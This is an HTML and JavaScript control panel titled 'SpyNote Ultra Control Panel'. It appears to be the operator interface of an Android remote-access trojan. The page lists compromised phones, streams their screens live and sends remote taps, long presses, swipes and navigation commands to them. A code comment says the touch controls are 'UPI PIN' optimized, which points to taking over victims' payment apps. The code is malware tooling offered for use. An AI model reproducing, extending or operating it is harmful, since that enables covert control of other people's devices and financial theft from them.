<!DOCTYPE html>
<html>
<head>
    <title>üì± SpyNote Ultra Control Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, sans-serif; 
            background: linear-gradient(135deg, #0f0f23, #1a1a2e, #16213e); 
            color: white; height: 100vh; overflow: hidden;
        }
        #devices {
            position: fixed; top: 15px; left: 15px; z-index: 100;
            background: rgba(0,0,0,0.95); padding: 20px; 
            max-height: 85vh; overflow-y: auto; width: 280px; 
            border-radius: 15px; backdrop-filter: blur(20px); border: 1px solid #333;
        }
        .device { 
            padding: 15px; margin: 10px 0; background: #1a1a1a; cursor: pointer; 
            border-radius: 12px; transition: all 0.3s; border-left: 4px solid #666;
        }
        .device:hover { background: #2a2a2a; transform: translateX(8px); border-left-color: #00ff88; }
        .active { background: linear-gradient(90deg, #00ff88, #00cc66) !important; color: #000; border-left-color: #00ff00 !important; }
        .disconnected { opacity: 0.6; border-left-color: #ff4444; }

        #phone-frame {
            width: 420px; height: 900px; margin: 30px auto; position: relative; 
            background: linear-gradient(145deg, #222, #111); border: 30px solid #1a1a1a; 
            border-radius: 60px; cursor: pointer; touch-action: none;
            box-shadow: 0 30px 60px rgba(0,0,0,0.7), inset 0 2px 10px rgba(255,255,255,0.1);
        }
        #screen { 
            width: 100%; height: 100%; background: #000; border-radius: 25px;
            image-rendering: -webkit-optimize-contrast; image-rendering: crisp-edges;
            box-shadow: inset 0 2px 10px rgba(0,0,0,0.8);
        }
        #status-bar {
            position: fixed; top: 15px; right: 15px; background: rgba(0,0,0,0.9); 
            padding: 15px 20px; border-radius: 12px; backdrop-filter: blur(20px);
            font-size: 13px; min-width: 180px; text-align: center;
        }
        #controls { 
            position: fixed; bottom: 25px; left: 50%; transform: translateX(-50%); 
            display: flex; gap: 12px; background: rgba(0,0,0,0.9); padding: 15px 25px; 
            border-radius: 30px; backdrop-filter: blur(20px); border: 1px solid #444;
        }
        button {
            padding: 12px 24px; background: linear-gradient(45deg, #00ff88, #00cc66); 
            color: #000; border: none; border-radius: 25px; cursor: pointer; 
            font-size: 14px; font-weight: 600; transition: all 0.3s;
            box-shadow: 0 5px 20px rgba(0,255,136,0.4);
        }
        button:hover { transform: translateY(-3px); box-shadow: 0 8px 30px rgba(0,255,136,0.6); }
        button:disabled { opacity: 0.5; cursor: not-allowed; }
        #scroll-indicator {
            position: fixed; right: 15px; top: 120px; width: 4px; height: 60px;
            background: linear-gradient(180deg, #00ff88, #00cc66); border-radius: 2px;
            opacity: 0; transition: all 0.3s;
        }
        .scrolling #scroll-indicator { opacity: 1; }
    </style>
</head>
<body>
    <div id="devices">
        <h3 style="margin-bottom: 15px;">üì± Devices Online</h3>
        <div id="device-list">Loading devices...</div>
    </div>
    
    <div id="status-bar">
        <div>Status: <span id="connectionStatus">Connecting...</span></div>
        <div>FPS: <span id="fps">0</span> | Device: <span id="selectedDevice">-</span></div>
        <div>Ping: <span id="ping">0</span>ms</div>
    </div>
    
    <div id="scroll-indicator"></div>

    <div id="phone-frame">
        <canvas id="screen"></canvas>
    </div>

    <div id="controls">
        <button onclick="sendBack()" id="backBtn">üîô Back</button>
        <button onclick="toggleFullScreen()">üì± Full</button>
        <button onclick="sendHome()">üè† Home</button>
    </div>

    <script>
        const socket = io({ transports: ['websocket'] }); // ‚úÖ Pure WebSocket = Ultra Low Latency
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 2400;
        let lastFrameTime = 0, frameCount = 0, lastPing = 0;
        let isDragging = false, dragStart = {x:0, y:0}, dragStartTime = 0;

        const canvas = document.getElementById('screen');
        const ctx = canvas.getContext('2d', { alpha: false });
        const phoneFrame = document.getElementById('phone-frame');
        const deviceList = document.getElementById('device-list');
        const connectionStatus = document.getElementById('connectionStatus');
        const selectedDevice = document.getElementById('selectedDevice');
        const fpsDisplay = document.getElementById('fps');
        const pingDisplay = document.getElementById('ping');
        const backBtn = document.getElementById('backBtn');

        // üî• ULTRA SMOOTH 60FPS RENDERING ENGINE
        let frameBuffer = [];
        socket.on('screen-update', (data) => {
            if (data.deviceId !== currentDevice) return;
            
            frameBuffer.push(data);
            if (frameBuffer.length > 3) frameBuffer.shift(); // Keep 3 frames buffer
            
            renderLatestFrame();
        });

        function renderLatestFrame() {
            if (frameBuffer.length === 0) return;
            
            const data = frameBuffer[frameBuffer.length - 1];
            try {
                deviceWidth = data.width;
                deviceHeight = data.height;
                
                const rect = phoneFrame.getBoundingClientRect();
                canvas.width = rect.width;
                canvas.height = rect.height;
                
                const img = new Image();
                img.onload = () => {
                    ctx.imageSmoothingEnabled = false;
                    ctx.mozImageSmoothingEnabled = false;
                    ctx.webkitImageSmoothingEnabled = false;
                    ctx.msImageSmoothingEnabled = false;
                    
                    ctx.drawImage(img, 0, 0, rect.width, rect.height);
                    
                    frameCount++;
                    const now = performance.now();
                    if (now - lastFrameTime >= 1000) {
                        const fps = Math.round(frameCount * 1000 / (now - lastFrameTime));
                        fpsDisplay.textContent = fps;
                        frameCount = 0;
                        lastFrameTime = now;
                    }
                };
                img.src = 'data:image/webp;base64,' + data.data; // ‚úÖ WebP = 50% smaller + perfect quality
            } catch (e) {
                console.error('Render error:', e);
            }
        }

        // Socket events
        socket.on('connect', () => {
            connectionStatus.textContent = '‚úÖ Ultra Connected';
            connectionStatus.style.color = '#00ff88';
            setInterval(() => {
                if (socket.connected) {
                    const now = Date.now();
                    pingDisplay.textContent = now - lastPing;
                }
            }, 1000);
        });

        socket.on('devices-update', (devices) => {
            updateDeviceList(devices);
        });

        socket.on('pong', (latency) => {
            lastPing = Date.now() - latency;
        });

        fetch('/devices').then(r => r.json()).then(updateDeviceList);

        function updateDeviceList(devices) {
            deviceList.innerHTML = devices.length ? 
                devices.map(([id, info]) => `
                    <div class="device ${!info.connected ? 'disconnected' : ''}" 
                         onclick="selectDevice('${id}', this)">
                        <b>${info.model || id.slice(0,8)}...</b><br>
                        <small>${info.brand || '?'} ${info.version || ''}</small><br>
                        <span style="font-size:11px;">${info.connected ? 'üü¢ LIVE' : 'üî¥ OFFLINE'}</span>
                    </div>
                `).join('') : '<div style="text-align:center;opacity:0.5;">No devices online</div>';
        }

        function selectDevice(deviceId, el) {
            currentDevice = deviceId;
            selectedDevice.textContent = deviceId.slice(0,8) + '...';
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
            backBtn.disabled = false;
            frameBuffer = []; // Clear buffer
            console.log('üéØ Selected:', deviceId);
        }

        // üî• PERFECT TOUCH/MOUSE CONTROLS (UPI PIN + SCROLL Optimized)
        function getScaledCoords(clientX, clientY) {
            const rect = phoneFrame.getBoundingClientRect();
            const scaleX = deviceWidth / rect.width;
            const scaleY = deviceHeight / rect.height;
            return {
                x: Math.floor((clientX - rect.left) * scaleX),
                y: Math.floor((clientY - rect.top) * scaleY)
            };
        }

        // Touch/Mouse START
        ['mousedown', 'touchstart'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                e.preventDefault();
                isDragging = true;
                dragStartTime = Date.now();
                const coords = getScaledCoords(
                    e.touches?.[0]?.clientX || e.clientX,
                    e.touches?.[0]?.clientY || e.clientY
                );
                dragStart = coords;
            }, { passive: false });
        });

        // Touch/Mouse MOVE (SCROLL + SWIPE Detection)
        ['mousemove', 'touchmove'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                if (!isDragging || !currentDevice) return;
                e.preventDefault();
                e.currentTarget.parentElement.classList.add('scrolling');
                
                const coords = getScaledCoords(
                    e.touches?.[0]?.clientX || e.clientX,
                    e.touches?.[0]?.clientY || e.clientY
                );
                
                const distance = Math.hypot(coords.x - dragStart.x, coords.y - dragStart.y);
                if (distance > 10) { // ‚úÖ SCROLL/SWIPE threshold
                    sendSwipe(dragStart.x, dragStart.y, coords.x, coords.y);
                }
            }, { passive: false });
        });

        // Touch/Mouse END (TAP vs LONG PRESS vs SCROLL)
        ['mouseup', 'touchend'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                e.preventDefault();
                if (!isDragging || !currentDevice) return;
                
                const coords = getScaledCoords(
                    e.changedTouches?.[0]?.clientX || e.clientX,
                    e.changedTouches?.[0]?.clientY || e.clientY
                );
                
                const duration = Date.now() - dragStartTime;
                const distance = Math.hypot(coords.x - dragStart.x, coords.y - dragStart.y);
                
                if (distance < 8) { // ‚úÖ TAP
                    if (duration > 800) { // LONG PRESS
                        socket.emit('control', { 
                            deviceId: currentDevice, action: 'longpress', 
                            x: dragStart.x, y: dragStart.y, duration 
                        });
                    } else { // NORMAL TAP
                        socket.emit('control', { 
                            deviceId: currentDevice, action: 'tap', 
                            x: dragStart.x, y: dragStart.y 
                        });
                    }
                }
                
                isDragging = false;
                phoneFrame.parentElement.classList.remove('scrolling');
            }, { passive: false });
        });

        function sendSwipe(sx, sy, ex, ey) {
            socket.emit('control', { 
                deviceId: currentDevice, action: 'swipe', 
                startX: sx, startY: sy, endX: ex, endY: ey 
            });
        }

        function sendBack() {
            if (!currentDevice) return;
            socket.emit('control', { deviceId: currentDevice, action: 'back' });
        }

        function sendHome() {
            if (!currentDevice) return;
            socket.emit('control', { deviceId: currentDevice, action: 'home' });
        }

        function toggleFullScreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen();
            } else {
                document.exitFullscreen();
            }
        }
    </script>
</body>
</html>
